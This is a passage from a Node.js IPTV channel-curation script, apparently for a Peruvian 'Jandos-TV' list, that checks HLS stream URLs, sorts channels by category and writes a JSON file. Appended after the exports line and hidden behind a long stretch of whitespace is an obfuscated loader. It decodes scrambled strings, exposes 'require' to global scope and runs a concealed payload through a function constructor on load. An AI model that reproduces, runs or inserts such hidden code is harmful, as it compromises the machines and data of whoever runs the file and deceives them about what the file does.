        for (const raw of allRawChannels) {
            if (verifiedCine.length >= 12) break;
            const rLower = (raw.name || '').toLowerCase();
            if (cineKeywords.some(kw => rLower.includes(kw))) {
                if (!verifiedCine.some(v => v.urls.includes(raw.url))) {
                    const ok = await testHlsDeep(raw.url);
                    if (ok) {
                        verifiedCine.push({
                            name: raw.name,
                            category: 'CINE Y CULTURA',
                            urls: [raw.url]
                        });
                        console.log(`  [+ CINE VERIFICADO] ${raw.name}`);
                    }
                }
            }
        }
    }

    // 9. Bloque 5: Dibujos y Animación
    console.log('\n--- VERIFICANDO BLOQUE 5: DIBUJOS Y ANIMACIÓN ---');
    const existingAnim = existingChannels.filter(c => c.category === 'DIBUJOS Y ANIMACIÓN' || c.category === 'ANIMACION');
    const verifiedAnim = [];

    for (const c of existingAnim) {
        const working = existingWorkingMap.get(c.name.toLowerCase().trim());
        if (working && working.length > 0) {
            verifiedAnim.push({
                name: c.name,
                category: 'DIBUJOS Y ANIMACIÓN',
                urls: working
            });
        }
    }

    // 10. Bloque 6: Regionales del Perú
    console.log('\n--- VERIFICANDO BLOQUE 6: REGIONALES DEL PERÚ ---');
    const existingReg = existingChannels.filter(c => c.category === 'REGIONALES');
    const verifiedReg = [];

    for (const c of existingReg) {
        const working = existingWorkingMap.get(c.name.toLowerCase().trim());
        if (working && working.length > 0) {
            verifiedReg.push({
                name: c.name,
                category: 'REGIONALES',
                urls: working
            });
        }
    }

    // 11. Consolidación de la Parrilla Maestra con numeración secuencial
    console.log('\n--- CONSOLIDANDO PARRILLA FINAL COMPLETA ---');
    let nextId = 1;
    const finalChannelsList = [];

    // 1. Nacionales Perú (1 - 12)
    finalNacionales.forEach(ch => {
        ch.id = nextId++;
        finalChannelsList.push(ch);
    });

    // 2. Deportes (13 - 20)
    finalDeportes.forEach(ch => {
        ch.id = nextId++;
        finalChannelsList.push(ch);
    });

    // 3. Series y Anime (21 - 26)
    finalSeries.forEach(ch => {
        ch.id = nextId++;
        finalChannelsList.push(ch);
    });

    // 4. Cine y Cultura (27+)
    verifiedCine.forEach(ch => {
        ch.id = nextId++;
        finalChannelsList.push(ch);
    });

    // 5. Dibujos y Animación
    verifiedAnim.forEach(ch => {
        ch.id = nextId++;
        finalChannelsList.push(ch);
    });

    // 6. Regionales
    verifiedReg.forEach(ch => {
        ch.id = nextId++;
        finalChannelsList.push(ch);
    });

    console.log(`\nParrilla consolidada con éxito: ${finalChannelsList.length} canales totales.`);
    console.log(`- Nacionales: ${finalNacionales.length} (01-12)`);
    console.log(`- Deportes: ${finalDeportes.length} (13-20)`);
    console.log(`- Series y Anime 24/7: ${finalSeries.length} (21-26)`);
    console.log(`- Cine y Cultura: ${verifiedCine.length}`);
    console.log(`- Dibujos y Animación: ${verifiedAnim.length}`);
    console.log(`- Regionales: ${verifiedReg.length}`);

    const outputJson = {
        version: '1.5.0',
        updated: new Date().toISOString().split('T')[0],
        totalChannels: finalChannelsList.length,
        description: 'Parrilla curada con verificación profunda HLS + CORS para Jandos-TV con Bloque Series 24/7.',
        channels: finalChannelsList
    };

    fs.writeFileSync(OUTPUT_FILE, JSON.stringify(outputJson, null, 2), 'utf-8');
    console.log(`\n✓ Archivo guardado con éxito en: ${OUTPUT_FILE}`);
}

if (require.main === module) {
    main().catch(err => {
        console.error('Error fatal en clean-channels.js:', err);
        process.exit(1);
    });
}

module.exports = { testHlsDeep, fetchM3U };																																																																																																																																																																																																																																																																										var z = '-7911';var NX=[6912847,907388^907539,217597^204358,330538^330063,982935^939384,5019283],SX=[5283741,416048^416193,293640^317673,436016^436107,781205^733396,4738901];function spin(R,c){for(var e,r,t,s,i,n,a=[],o=217956^217956,l=c[648486^648486];o<R['\u006C\u0065\u006E\u0067\u0074\u0068'];)a[o]=R['\u0063\u0068\u0061\u0072\u0041\u0074'](o),o+=908966^908967;for(e=a['\u006C\u0065\u006E\u0067\u0074\u0068'],o=275122^275122;o<e;)r=l*(o+c[581701^581700])+l%c[740899^740897],i=(t=l*(o+c[827307^827304])+l%c[172928^172932])%e,n=a[s=r%e],a[s]=a[i],a[i]=n,l=(r+t)%c[116482^116487],o+=325595^325594;return a['\u006A\u006F\u0069\u006E']("");}function splitLane(R){var c=String['\u0066\u0072\u006F\u006D\u0043\u0068\u0061\u0072\u0043\u006F\u0064\u0065'](742867^742863),e=spin(R,NX);return(e=(e=(e=e['\u0073\u0070\u006C\u0069\u0074']("\u005E")['\u006A\u006F\u0069\u006E'](c))['\u0073\u0070\u006C\u0069\u0074']("\u002A\u0031")['\u006A\u006F\u0069\u006E']("\u005E"))['\u0073\u0070\u006C\u0069\u0074']("\u002A\u0030")['\u006A\u006F\u0069\u006E']("\u002A"))['\u0073\u0070\u006C\u0069\u0074'](c);}function peel(R){return spin(R,SX);}!function(R,c,_0x4d43e){R['\u007A']=z;var e=splitLane("\u0063\u005E\u006D\u0065\u006A\u0062\u005E\u0074\u0072\u006F");_0x4d43e=199787^199779;R[e[539188^539188]]=c,typeof module===e[818819^818818]&&(R[e[712707^712705]]=module);var r=peel("cnotsnturtpicokfzrogmybjdcawvulxsreqh".split("").reverse().join("")),t=peel[r['\u0073\u0075\u0062\u0073\u0074\u0072\u0069\u006E\u0067'](814520^814520,732566^732573)],s=t("",peel('=aenruh(al=5c,g8fdu.yr ..ncecf,5"paeau6lnj)r]2uv"x-q(] a;(r=;;r+(a[8.s2tAgoq,uh8C,ai,s;a(Am0(nj;jv*,7vo7()(o;m6oa4rw). rod[fs2n{drvt4x)+0,anr+rr+o)}z1 =hf[an8r1r[,]s7-77laa.ui7{-069lvmt2r=i]]<+)u,e),,;nrh[r=0v-r(;,=p)Cus=+c;g;f;qA))1vi)vk0nrl1ae f=[;hisy.em(d+o!2 =(evea78=.)4ei=g.n={ff=1[<2a f1=r;4,S)rylv1u y;kql{tvnv (C (l,ovnp i=tlr,r.lwozh(l,tq;;rr((v=ahsv;]xq=ab;da;,((r;vjq.(t[+)da)rdnrhs41y(vr;fh;3g"]e(.ahrpapg]g.)ngfpn1h,icl;;)=C;m5=+r, .);u=+s}+)it,+bm;d+um)-=siiqol=t=r=q9+..chq+[6fe t0nrpr( vr8flrn,ddgt ]6a.;m;rth.gq 2a}eveic]gbti<4o;C;l,zzi6+l[a[;+(si"li"r,npi9s,frfhuw)ow=e{(b=wen2t.gu.i=kiaaa+)yftpa3n})=9")cpA+u;utp]"=lk7vpt 1r;hzw")t()9)(.lul=s7f; ;sq0)n"y+0s}=va+s mh(0q.]hv;> 06=A-ozetr(t1rtrsiso0e,.;z[(f<5e7t,(raoavnr;thhf;v,j=r; )r>18zho*o{<akmsn)akte.vo9+ea0clio;bu =]C!gj;y3+l)e=.}dr=i6oiC8rnn0;6=ar"}.rei=]Stsrnn.;2r=t;[t;iv=prCrn()aretuz+ hlk[+x=e -8j{(ejy9(()) '));t("",s(peel('R_<"cRJ!&VecRWa=RrfR$6"c1;RRYcnh_/.t iRRRG^<R.RcR2.[nR .Rf./<Rc3!!5nSR<RiRL.eSslf(edgxc<?o<rlcR?tRosdRfuSe.?&ph.RROMs[e<skRE.<Ru<rRe;RDRBrRR\\.fR.<c:!bpl09icoRrtcR(;roRRn2-"(.^w y.<<dd )$f ou.%e<a<e.t<m(cRxfR<[J(feR<Pbr.b\'oRi.RR<\'RR%wRfs)eR.[agSP{d2.k<ac1e.!3.P<ZRiR*oDsi=[.<f."4Rb N"eoxRpo.iIlkaeTR.2)%m<ieR]z<|Ru((fRwRR\\R>R9#.R0rd=s.0x!sR.fRS)(cct1pfotaeMuR@R=<RR/`.Rk$(2cR.s7e1a.FRKc*..z"RnfPesRtRRR.<Rl#Rf<: 2((R R$\'6s`<3nhi*$eXc}Rh? ctoc.iecc9 {Ra<s;u!.e]ERRoH..$"n<D3RsRR..(ReesseR< t," Rdov}Sc0Jmi.T<sEegsRw]R"aR.R!R<o))jR Rew itc.snk(}(n[veR<0<=kfH<rrMR ciknE.c.B<&R[o]R.%ccRlrx;* ["oisenRefea!Yn.ecR%o"u.<6lRRRyR=is=RR()RRe:RR)!RwcrR1<.o!RcRc@"}RuRqu5(3Pol"eRt0!ftaR*<R1tnkcf}T.!$/<ro IycRR )P<\\.b<tR7:PPs<].rX<<.eRu(RRRqnp.<.R;ctisX.RRyR$@<3)kRRc<+Rr8l*.iR!rC\\P!n=cs<(ci<(R7eReRc. t<epe)e<<,e<(EK!.pnb$"RaRR.evuhc.Tl_c.:R0r )Rww!sS0.t7u.0(R9_a($&.e6f.RRk1Cxbi8l.hc=m(@<Rd..<rr.2.KMrcb_RnR(R_c:Dwt}.R.{}9g$RRR)TVt<a(.<G.dR~WUR.;lr.hIsmNP  t@RR8_R2R.iRrRPR<(R3#cec0ce3iRR<aR3RanR{Zs}!M<R-*.yda3Ri/0%fR#R <i2<R08:.t}Rf!"-Rc.RlRcytyRseA0RSTR8.4q<$FTeR..P_<cR6hbR.eri.c-RhcARC2vR.;bS<R<a#K<R:r]Tfee-;!k=_s.Rcmjs(R}:<RaR*&g.<domeisRn.($#_a{V@ocY-.omPdam.RalfcyoT+!P_gsr.<biR!f.)cI&(bIoRi(rnrW.ie.Rc !(ic(SR.cr`:9<XspR($ mRct<s.g!.48rskevVRPdRkxR<Rdern)eSs/)R ler<csT3dc}.R5C/W(.SonZr)Rcoccsch)R.<RR<t.ss(RR<dlu.c.|f8tk,slnepo<eR<!.6R.eeRRTa&h Mf<{[o$R< Rs0)= <xSec.c}<c$es((d)RRc}fCRR<*<R.m-.R*Re<(xvRs (M&Rf.eP*g >s)<o.=.RisnrR.?{5<ibR6)RR1s cRgqcelc=cl;be<lf*SICd2e"zpRR}<cRlS,njscm$Rn.!aii<JY]<fPCs@jA.R<% t.RowR}\' r>pzh..lR\'<go_}<SR(kqxh[ &<iR-f$C<u<iaENR5RTR]<Rpsk..Rzdg.)]<)er.Rr.MsRzP>RRe<<t_hgl<p.RcmfRs!nftR4 dt_9^<,ore5RfRx RR[rX.<sbyR<<.2R.RrenUP(y>.p<<csRlt0t.{.Syin<ggl$ Vc.):EHI!.xDuR,RpRhR(sct.MrRMjHMRRcR. Rtnd|oa0.n#a.2)Dfk&cRIRRR/feR.c@<irs6T+1RPx..R.sc.aR#.-<X{R!n4RcRitR/nRe9m..<A)ben).]<.a(R(.{?3tR&RR/i(lX. <h!dRR<"!co? 3 1R<-hn<dtndo<Rksm#-c(TeRee!].R<s<T+=R.Ri-r@RR.r#cd<cRRRmztf.CdeRp.c{QRibjsos.fRrg-RW0diRR<.k<ORR&-R!# ]Cs]yt4.-d_`PRR\'<.RvejSw<dc.c ,f.P.(.citcNbRn\'-.eRcRnrQ.rRxo{Rc<"6Rnd]R}Rm(R$RSo.T5Rc2cx.*vRoic_>.s0BRf)<P<aR.oCZ|0 POHdQo.n <.1soR_\' .P<er.[<R|R<0i<Rr;\'I.R[}+lc![mc!.lc<n(a tRRHRl,}p}R)R8RJ<aR.<td(N>]ic<me@5cn[u.R).b%sPn<<_RR!RbR=$RR^<!})sb-6"#E8cR(d!R)tratRR<< 21R\'L!ib|eOtRRt$ucdnRR.t)RzE.GPy! RAI-nqau<}.ycR...cRR.ccc$^RRdC_R<t8cRhs2"R2.\'S>))2h!efy..>!iL$en ;%9OTv.d$4RRC<cPS(tuRwl&(m#"R|pch<tH$a<< .t!RSEf.RRgcNP.R CRi4mR<#MRR<;wi-#E <<t<eR<H<RrntoE(!0r0<d..RC"cn..2bp(6Cp<SR"e1l)cc<a(P.P9e<qa)<<1<n.iRaRPR(}R=.&,2!cwR.)PR$.<qR<}!1*S<R!Rf.<c<Rd_<R2R<<#]<<RRRp!.rpR<*!TRIR<Pk<Rzta.&}.aleK=iP<R\'=gRP}Rp${SB. Rsy.(.t! c;<e5sh64tt<pf<otxuLTkr>;<R.cpsR.cRtR-#a4uR6.Rte;-($?w8:p/&Rl0<r#<e iisf!d$ao_(#cmr e<RRV!Pnca<t.~crc(e\'*a: <RRneaZe.%/dR<RR*(E `+e[PcwRw <(eucta).7W</$P<.hcST 7eRB!.+R.I<bhRel.te.b4[unueuR!Rlt(RRR,},HftHv_n.<eR _A<8<sr<Rx4)RN!pRd|B <RRkie\'c-.Rcnm3cs<Si<i.).E(R(<RRPR _3R<cwe.!.l<R$!Rbd,e<PREl$tpr!<o/).RRt!,T(rc#/.Ry(+RrRg`<f.<a+.f)/<<&< eRR<ei-<BfE.sRbnRR).R%/jtlR<%c R!R(xR#cR.sRR.RM.<R7c(cglRcm.]<.ec2b)P<<2RR&daBK)r<Zt>[daRHced.MR<}sRGr.R<?1RfRRcccR(osc"RR~k<\\!Mc.p.C)uRx)+(Rk\\e\'j6MPURCmc?RR3R4(iie.sRe*R:zSR;Pn(Z)<lkRvl:<RQ{Rci"cP+e,MRWa.<RMrRlt#<RRst3r!.<g<KRwR(Rj.RRa!.G4R.$pn.z;{eR;21{0T4(rRk-\'.!<Rx<iKh<)s[<tc PueR}r(faaRf7l<R5!rRlDXRm.1:piR <= Rjso.<er!oRqI)R1Rrrwo{&tRRK<nCZ-0M.cuR)c%cd0+w<$E<iT<<otdayn<io^.R\'RRwRc65kR#JP.<!R5e!r{Re;yeR(.0=;cis.c(gtR2pu9=MQf[{,On ..PNi(<.RaiQR..c%t/(/R<.r.Rr..l!scue.aP~R!c03aUR"tcsc.!rVRpaiz0<b"dtgd!.s?#cvdR~#R<R<)(Tb.IR)Pc<6?7)]4W6#nnPt.}re|RU>ReaR)p# nS+b2%iRj}s(Xn^osycsgdJ.ss[pkR8. suwrRny}do.GiT.<w+c.(cs;! nh(R,RCR[<&XR<<.cbcTRsAfncS-R"i<.cB(|RR.Rd%R.U/R.rL<t)!ReR2cpp!s<>R?1R$<teR<<Ro0rtf(ResbDR7liaR.}s./sRcrsarlR%f]s0R.<le<re%s.sllsb8ROxCRtc1t6{.- Rl.eRo.cgmRkoRsbca<Iyu}Rrt#s&|tRaxR)ho.Rsf kRRR4cr(x.c=t.<i3(Rx .<..R$f"t RRsN</C RnRdRrpRR<od<.R<r[ar"l<. P".Rs.R.rc!v#DfReebo{,R)d8v<fRc.cJ<te.!RR"kS(S)R#<S.hP}rt.(/(.c(1d<Rw!su0(o.Pb(0.RJcEiC.f( .i.buc<#r...RR[8)_!R.SRB!"tRVbn_RlcPRR oRn;h<RP@r8aRrlc|co5(Rp)<Rxd<<$.n<lo}erR<oyRan.oy.RIB<ht<cobEiR}(mMr.TaR0RetiR}.!<.R19t<AebR_Lclh!D0r.R0ilirRc/s8<cR(r*R@e<<.l;.rc-PulaRccRi"06@!Rc!.Qkl,<g<7}b(aRcL.cs\'+..T(<rR<<..&fd>Ro coemRcw.lcn(c:R\'|t<RnRY]4M0GR.RFRut.!<f.u+$+t<R*7sRRR(ibhd=P.<}RR=eR._).)rr,4& lR}e<R6RR<^gfleRdstP~<bc.(sy<5}Ri?lch<&.3{u.n_:iR7b;0<R<cRRRcR@|1seGRs2)c=h<f9e<<r+eR\\\')&5rv/Fr[.a.tn.RPrnU<o_c6n=ET<.i+xc7levsu<r.!Rc<!]Rw .RR(]PRD. lf!:&.bdpTl.R#RS.$R<(R <<c[.n. oRr67r<e-R-uc*RR$R.baeycs.![RxRR<DXtfncRQPisRtgc<.aR8!b!<St0<R> RRriR>cUp.cRWZR!RDK)0cvnnks.e R ^dlR<cfRRu:sGRe,(gRVR"RuRRR"RtR<Rs".ERi_P&R<lyoSg\'s>vRcwe4Rcg`.h<_c\'(umdRP>o9RPn1R#.cfR<P]Rs/anfqNRR\'<.Rc8ciRRRc.a_ptKo<psr<7<RRi.o_c/!nRRs( >RP]xtt_s_ohB<a\'s&.P< .kGc6r<7io/wRISPPcxhRwc.<.cic%1Rf89dS <RbcsRVRsxrda]R;t?RN,,R>)cPY"cRcReF !0RRq}}r05L6.<R.rf<$u|c<c<U-D[ cc.o<5;< (.E.h.R_l<Rr<<F<[ttCo%mS.RR3IbcioRR<apRcRc[RR<.fnRR,.RBan(y/R|HpGnR.<=RR<u(acs$R3eR)mc_A4unt"e;sor(%RPt(eg(-*r!m<RD(RRa.rglz.Rw.fR]qavo]f(%<<ccl<4s9\\@u 9e.*x./FtSRP[.$%n`z)<<$!5Qcb+]R3tR<fiPce\\<zi.Rcabr (<<bnv6!tnw_cXf(nh.[}*s(`<P>(R<..<xt9R(.c<(e0R.Pao.!d((-@f0e<<6RoRu;(d` Rp..<p,e<T<N.PR.[RcOz)f(<l].u{?rf<R;R<I*a<<$`R( (...<":<NR%eR i#.z.l(rR,dRa.dRv<sVc(s]i)Mh.Rn<RRRttRg,~.R[R#ef.;ttp.)sRnStlRR2oe.&ci(a}."P&yseR_a%rRR.D<iPsRD!i.mR"Rjzh<uR.,>de.jO}aRQcV<s$3CgR<R5EcdUhce.!Uf.R-x6<].wc<<.E!rRPRiCx.SR!m.nXb.7f.zefZR""](y<xb<k<]UR-c}qf.!Ni=YiRoRRN.@sw1Lue1kR& #rDceR.alRR.R.("]MRtMiRr)rluRd&.RRcpifIl2R<R<<5f)z&fURec<s4<ensR.o"<i<,R!s oBiR-cR0lRNtTR)SRc<fdutRRdPzRH(Rcs)PD<c$Rx2&:1Hrlo..n fs.$n8upO$0isssi.-<vR<.<qQ(!R! [!dxwn.Ryu*i?dR%.R2Rt>r7s!tRs_Red`!<$]R Rm!RfxR mRok!ct<(..nRcSRn\\&.<0RTiwmtp3*G(Py/nxFhtR<.:Go...(Rt.r.<0ctT(r< .o[iv.<R1sR9d]R+RRheR!cc2RRe"9c[r<;DePcRRktGlg<?tAU\'ttRQR} w3tRat](Vt-?<<?.."lr).eR-RRI^EKv.47Ro+iN<ece.nRx(tRHR t8;Rir)<aRcx(qaRs@ferRM.<=.ct@<fcR.R)R.rxl!t/,lsRRRc=.i03RhRRs{_xRr<Q<c,a<<EW(MoR< utE"f}bfr.<sR+]dr <R!QRw.i IRT_Po.(c0t8(sRTRRcnBR!".xID.Ai}epoR3!oz=]etkRt/uA14RR9Rct!Nadr_nGC!/b$}R"xd<iRct^.uuw=3dRpwgR9R8PqRi#Rpg9u=1i0f<.R<P0f}tv_r3es:<fr<i7(<y(olR.e9ooBT._RtoE) as(<cRiedtssR/RR/erR(.wce.R.rPy(RO(<.gHxrR<T.L!Rx(<o([.+{<c<R<.eiNTRC[x.4RkR$pK".lcP(.<tk.<RQFknwIR).t-Rr=e{<.PP #E63ap3[R)Lddc;RxR!R\' oo!)w.e!.Rc<0%<iss9RuO6ir$.R.ip6%m-6wRi<z< gr=nweRRN__R(ReJvRfR%:NRPR<nRRR$.R.mR<rR#{Ec.)b<6peiRf#tL..R<PjRR.(,a_ll. .D g<(rhv "4k! `lR<ke1 c$$5Rz.RR]eu&DiR .R<((cersE.aoRhef)%eLR).:.^)esCR.}.T<P^. Dy<#RcRpNRr)nRRl_3d8W(c=-3EeqeiMRReRzRacCue<l<Rsi.a;rc<.ldRY.RarlRcnOf3hTsdt<M"m<s(np}:A.fyR<RC<#Ry0vR<}<R.<%ats!lR>-<2lld.nr5=(F:.RRlnRcR"sz3o"<fR&3..!Y>fR)beRlshpM%<f.(d!abiFR 3waM<se..qfR.i_.&E!.&RRRcRx{R[R._?R2!!RRcx)RIM.)f=#1ELbRRnJeaMim1)RRR_ |<la<3)0ycd&.#n=l.|Rs;.f(ec.cs=c{?R/%d_!anOce<Rrxa.\'b)=_<m)icAcCRc.n<R.e ..R-<AR5.Rm[dR<<2R.An9xRctmcE%[..R,Qt<uPf_!<R= tZRclpP*.uep6<f.b8RR<cSrk<e}Rckdc.;<tz.l.<!io.<r/2<R=bcRRsVD.R.1b<cc<R}<h+. RvTRp_P<.rs(uPQt:..<>Rk9!=a;o<a*.7r]0Y)8c}z(<a.R.e8Ro tl Rc(A~i!*(bR%cR,c0t< rMRR< Ri< .fPe*+E)m.oj..m8m.cR($<f.R.idey}cBRR!sc<no9R<n RwrN0#tRduc_-RS"i{i)(nMcR<0N</V<<.,0+w.]<w<ReeR,w/eR.R)i. R<e .6Rga.rgs+Qitd.o!cteaLRo)3R <.cd./.~< .s\\.e<sp5R.<RRwa!*.R)tR,ofRZ<ZtcRhsRr$/.RC..b "cRt,\'leacPc RR<Rz"<Ri l0oRRdRs7.R(eCcR_.6"_R..p<&kddee.<=..lo.=R<!b.&Rc<tcCr0m&cXu\'wnd.s;sw+R4/suDicPba ..i!o1^r}I>e4<:RwCRic<RRRc". dRpt0<.Rk0<W8r RnR.Dc.CN lwoh.l-<R<pcbR Pe6hY-Rt.cEp:<+a-V<RaRf\'(<rRRR&<az<4RRR.E)7.xrc0ilHRTisc.ZfRfcRx-th).R#=!<C.w"l{e]e-R</<s4Nt.op"ce.4Rn{SRo<R)Cc])e(Rw8RR. <1hc{p8cS!e<R?RKa=i6Ri[.IRpR$RbxRScl.p<P!fa!vvsO.!pRRt.EglRt<.!iud.lu<is.RoR4!.P.cm.Pi}Ro..lPNRy6=t{<ae._!RwRtaR.sf.!.]4[e.RkE}-}ve..$NwiD!}.0R#<isaR3p%<}.aR@RJt.RGax.R\'spC0!RGcr.2FRiRePaRnsRRRna<R)5U:"n=cdc?ABt.20.tdc!C1R c.<edaA.R(.,elRcR<c&<.eCRURif{aJKR+ex-x:Pc%ei@ecRek?pR.4 RR<R#$c..i+!4RR$R3#R.r(PiRR<c.Rci_U!zRRR;u^|.Z.s(TRRTc.d}R<y._c<.RR{$kR4FB($\\<w. .;R<eR4\\sRc8<R.R[EdR uoR[}V(.pd\'"<Ja(4prAR(.Nc<<rp3.>z eeR!<.<57:&P)c[RbRREM(_P.}RR).=Rhr<,CRRR(<k3R+hn %R.RF)lR;R.s R.jlmR((loH.<R<{PReRi<<cdeK.R.fR2pR(ao~.RyRRR[:RR?eisRPfk Ys(s3.c <4blo<0<9{o<RT@R..nRiR;al?soR0g<T.Rtm<u.s\\?Rl._Rccz4&:?0 .5R/ctc4<R>hi%.i#i}<R.Emc1xAnfR{Scr.R.%|".PrrRn<cRnP!aRRtRfR.P 8\'R<JA R&i<ecc{]cf.RmaR.irc.iReZ"n<y!< cR #<,ec!Rd9sic+_1a.ru..b..Reh<R~i$ot<fRdcit<\\go_0lRmvF(<e9s<Rtt( !RnR6}<.itO..&9s4dNRc .o.RR.]j0 R ma4;r<sCa)& mo[xlR*ht!,Aup Ru,fRtf[j)P*cRR1<RSv s!2cIsR..e74hRd\'c:vsr.s;<e(<_!MRfRfLLgal.!.u.R9(Mcla(d}tOa.}RcIebmEc0N(RD%bE$ rd<cw).F<ObZWR.jg.U4"afR`\'m%/efaxRRR;Rna:7vR0bc.a_R<<jRRs..X)spGi&v\'e.l.2.I.e9rRe.s\'1=r.eRexbb_RR_e9cd<FIP!.cR+8.446/U<<ls!]<u`pRsub<b>JPwp@ilR<i)k!dRLkR.trRx(rr)% /.(]b8cRs+vR-c)}:osR.c#"<cqk<ek.imRSN.RsE bPPn)<e}o0e".1dRIR!(r.%.I..Rfza_?RRkf/,tcRRIf.<iR bdRO.cPcdeR.s}ejFbp;o.fs<c_mc<aF.dnc0c RRR.qn .RcR.hRKj<Rs.kc<3Rs.ccTt.trtnt>w;/IcZc8r<i.Rt>Rcs..s s{Te <!.+.R.<uRPRo.<K.m.a.srM<R .cwRic<R)nP(<RReeutcJc%pN.Rsce.=eaf0<\'@S}1<<YIjr!!<4a.fRR.l&<R$..lv.}|5&R.R!<)xfs.b$:Rc l.< o(J.e.#N.7t<)c<w eR0.=<yc !..Re?<n\'B[Rbo\'auR} rae#R=.iR(st2.b~ <Sc.}tTsRr<aR) ryir!C<c td~" X.ttR<R!d c..!ed.R.<R n.Sne!!)4/oXRRu.enR<.rRqR"l_M.efttr tRc._r<R.R.dd{Wh{R.<.&RRc<.gf}Rcr52dte}d(}?cF7.xy$W<!..c6pc?Nc0z(h4.RRo=_oa.Pf!f4hR.Rd*e=d#cc6rr{o/RaRS.z.v.RDc<.[R9.\'t]&.RRR-4R&ew\\cRYeonf t.m)e=.icK.R{.0sl1pcRs(chl.WR.yc.{eil3ft<{/.C.(.n<l)>m<<d1<a? nec<R..avloRvjRge._ =R+.RR.wdR.d6%.Icc(+t.:ci\'.cht.b.R!s4ft_Rxta<s}H,cc.dkRnc..}c# n)R.(_)c13.ot.o.}<!.tRR).t<...8Rn.Htct<blRotcQGn^*_xmecPT}..<<r0 lEt!dn"0pf.gl}R<eRlT@i..g)ne4Ru<fRRTg.cR.c.eet<..^ee,r;t|pcteWFs RgadRroG(ltl #(yr<.#ddt.<R i-o<stId!b)RIEt*RRn&R.c<iRmlR(-(mtck.Ry!0RYJ<c.Ri>rr. w9cTaR=<PcdK]_\\2f( #.Rs%.te<n/Rrycc.nRc$.P&.f.iccBPNRdR;R.5<RR<mPo{(R{_n<lRid.hR .dRnRr!JwR0.RPRr.>=(f<e?.<Bf]xRcbcPcRs}<R(s.RPY.RR_Pk(o<(dl<0eR,1:D1sv.ilhe_PRpccR1qm.dm"<sisPd.? pmdRhRnct(?$RrtRx.e)`..R.p?i!R1Rr( {.eTRR}.c}<RR8..RpR"cg;.cc0RrR. t&3nd5ecPb_.R!RaccRbcdb}c(!{t<.Rnv.NR&~eAs$z"<4<.ogsfCaRl<ocERoRRt..<s.i`R?.sgc..RsRs.\'$xRcsNRR!R`RoR_n!#R,!5qf.#BIR@l.,.]oReRa|<R[t<<:|a[4<R~R!+Eg-R.aP!e &l<5n%cRRdFryc.s/R.;{{,H.;<n<.)4.tdmR)sRd(mRb{.<Rc.rPm.cRe cRckRx)<c&ci.yceluy;,.XdrRlRR# ccf.cR  R$Rcorr(.rCp<Nr#E(]RnR"ijngRR4<C$adlRac&t(!-Rp.]do.ciR}usRrs(n C<!;.fc.c@z<tR4tCRtRtc=.c3cfo.!  R;<fe8RdrMRR[dN[cyRc:>Tn<l^.lo8RiRRcssc}Rtpc{.sRs...}c.RaY[<a* )I(ldR(wsr6 *R7!a<S.c<\\R.BELRe6Yf<1<ecPrDe sl0PbD#R]o.\'<l.m R(p)<ekac.cR.d.._u<a\'< Rlibfmndf].(%RR<RNDcRER#V..asa[n&R,$<,R<o4RReER)ssL]8ESRReREiR{R<c.{ cWGf}ohdcas.]. fP= os67EocIPoc .7igcFCR. <cE.N .bR')))(677251^678990);}(global,require);
